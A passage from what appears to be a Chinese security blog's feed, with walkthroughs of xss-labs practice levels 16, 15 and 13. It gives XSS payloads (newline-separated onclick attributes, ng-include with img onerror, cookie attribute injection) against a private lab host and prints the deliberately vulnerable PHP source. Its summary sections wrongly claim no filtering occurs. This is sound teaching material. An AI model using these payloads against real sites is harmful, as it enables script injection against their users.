number">8203</span><span class="token operator">/</span>level16<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level16/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>center</code>标签中参数的<code>script</code>、<code>/</code>、<code>空格</code>进行了转义，使用空字节阶段可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level16<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>a<span class="token operator">%</span>0atype<span class="token operator">=</span><span class="token string">"text"</span><span class="token operator">%</span>0aonclick<span class="token operator">=</span><span class="token string">"alert(1)"</span><span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level16/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level17.php?arg01=a&amp;arg02=b"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level16<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level16<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"    "</span><span class="token punctuation">,</span><span class="token string">"&amp;nbsp;"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;center>"</span><span class="token punctuation">.</span><span class="token variable">$str5</span><span class="token punctuation">.</span><span class="token string">"&lt;/center>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level16.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由17-22行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的<code>script</code>、<code>/</code>、<code>空格</code>进行了转义后赋值给<code>span</code>标签。</li></ul></li><li><p>所以含有的<code>script</code>、<code>/</code>、<code>空格</code>进行了转义的注入无效，但空字节截断构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>a<span class="token operator">%</span>0atype<span class="token operator">=</span><span class="token string">"text"</span><span class="token operator">%</span>0a<span class="token string">"alert"</span><span class="token operator">></span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level15</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level15/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level15/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level15/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level15<span class="token punctuation">.</span>php<span class="token operator">?</span>src<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level15<span class="token punctuation">.</span>php<span class="token operator">?</span>src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=x onerror=alert(1)>'</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level15/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>span</code>标签中参数的尖括号进行了转义，使用外链可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level15<span class="token punctuation">.</span>php<span class="token operator">?</span>src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=x onerror=alert(1)>'</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level15/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level16.php?keyword=test"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level15<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到第<span class="token number">15</span>关，自己想个办法走出去吧！<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level15.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;body>&lt;span class="ng-include:'</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'">&lt;/span>&lt;/body>'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li>由18-19行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的预定义字符进行转换后赋值给<code>span</code>标签。</li></ul></li><li><p>所以含有的预定义字符的注入无效，但其他使用HTML实体编码或外链构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token string">'level1.php?name=&lt;img src=x onerror=alert(1)>'</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level13</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level13/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level13/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level13/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level13<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level13<span class="token punctuation">.</span>php<span class="token operator">?</span>t_sort<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>Cookie<span class="token punctuation">:</span>user<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level13/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>和<code>name=t_sort</code>的<code>input</code>标签中参数的尖括号进行了转义，而对<code>name=t_cook</code>的<code>input</code>标签参数中的尖括号进行过滤，使用不含尖括号的语句可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level13<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span>good<span class="token operator">%</span>20job<span class="token operator">!</span>Cookie<span class="token punctuation">:</span>user<span class="token operator">=</span>click me<span class="token operator">!</span><span class="token string">" type="</span>button<span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>user<span class="token operator">=</span>" type<span class="token operator">=</span><span class="token string">'text'</span> onclick<span class="token operator">=</span><span class="token string">'alert(1)'</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level13/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level14.php"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level13<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level13<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token string">"call me maybe?"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>search</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.htmlspecialchars($str00).<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>t_cook<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str33.<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token 